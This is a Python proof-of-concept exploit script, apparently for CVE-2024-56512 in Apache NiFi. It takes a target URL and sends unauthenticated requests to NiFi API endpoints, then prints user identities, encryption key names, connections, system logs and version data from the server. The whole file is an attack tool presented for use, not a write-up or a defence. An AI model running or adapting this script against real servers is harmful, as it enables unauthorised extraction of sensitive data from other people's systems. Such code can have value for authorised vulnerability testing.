import requests
from art import *

print(text2art("Poc", font="block"))

print("[+] Poc | CVE-2024-56512: Apache NiFi Vulnerability Exploit")
print("[+] Author: @absholi7ly")

target_url = input("[?] Enter the target Apache NiFi URL (e.g., http://example.com:8080): ")

endpoints = {
    "Process Group Information": "/nifi-api/flow/process-groups/root",
    "Configuration Information": "/nifi-api/controller/config",
    "User Information": "/nifi-api/tenants/users",
    "Encryption Keys": "/nifi-api/controller/encryption-keys",
    "Connections Information": "/nifi-api/connections",
    "System Logs": "/nifi-api/system/logs",
    "FlowFile Queues": "/nifi-api/flowfile-queues",
    "Version Information": "/nifi-api/controller/about"
}

for name, endpoint in endpoints.items():
    try:
        print(f"\n[+] Extracting {name} from {target_url}{endpoint}...")
        response = requests.get(f"{target_url}{endpoint}", timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            print(f"[+] {name}:")
            
            if name == "Process Group Information":
                if 'processGroupFlow' in data and 'breadcrumb' in data['processGroupFlow']:
                    breadcrumb = data['processGroupFlow']['breadcrumb']['breadcrumb']
                    print(f"    - Name: {breadcrumb.get('name', 'N/A')}")
                    print(f"    - ID: {data['processGroupFlow'].get('id', 'N/A')}")
                if 'processGroupFlow' in data and 'flow' in data['processGroupFlow']:
                    print("\n[+] Processors:")
                    for processor in data['processGroupFlow']['flow'].get('processors', []):
                        component = processor.get('component', {})
                        print(f"    - Name: {component.get('name', 'N/A')}")
                        print(f"      ID: {component.get('id', 'N/A')}")
                        print(f"      State: {component.get('state', 'N/A')}")
            
            elif name == "Configuration Information":
                if 'config' in data:
                    print(f"    - Max Timer Driven Threads: {data['config'].get('maxTimerDrivenThreads', 'N/A')}")
                    print(f"    - Max Event Driven Threads: {data['config'].get('maxEventDrivenThreads', 'N/A')}")
                else:
                    print("    - No configuration data found.")
            
            elif name == "User Information":
                if 'users' in data:
                    for user in data['users']:
                        print(f"    - Username: {user['component'].get('identity', 'N/A')}")
                        print(f"      ID: {user.get('id', 'N/A')}")
                else:
                    print("    - No user data found.")
            
            elif name == "Encryption Keys":
                if 'encryptionKeys' in data:
                    for key in data['encryptionKeys']:
                        print(f"    - Key ID: {key.get('id', 'N/A')}")
                        print(f"      Key Name: {key.get('name', 'N/A')}")
                else:
                    print("    - No encryption keys found.")
            
            elif name == "Connections Information":
                if 'connections' in data:
                    for connection in data['connections']:
                        print(f"    - Source: {connection['component']['source'].get('name', 'N/A')}")
                        print(f"      Destination: {connection['component']['destination'].get('name', 'N/A')}")
                else:
                    print("    - No connections found.")
            
            elif name == "System Logs":
                if 'logs' in data:
                    for log in data['logs']:
                        print(f"    - Log Level: {log.get('level', 'N/A')}")
                        print(f"      Message: {log.get('message', 'N/A')}")
                else:
                    print("    - No logs found.")
            
            elif name == "FlowFile Queues":
                if 'flowFileQueues' in data:
                    for queue in data['flowFileQueues']:
                        print(f"    - Queue ID: {queue.get('id', 'N/A')}")
                        print(f"      Size: {queue.get('size', 'N/A')}")
                else:
                    print("    - No FlowFile queues found.")
            
            elif name == "Version Information":
                if 'about' in data:
                    print(f"    - Version: {data['about'].get('version', 'N/A')}")
                    print(f"      Build Date: {data['about'].get('buildDate', 'N/A')}")
                else:
                    print("    - No version information found.")
        
        else:
            print(f"[-] Failed! Server returned status code: {response.status_code}")
            if response.status_code == 404:
                print("    - Endpoint not found. This API may not be available on the server.")
            elif response.status_code == 409:
                print("    - Conflict. Check if authentication is required.")
    
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")

print("\n[+] Exploit completed successfully!")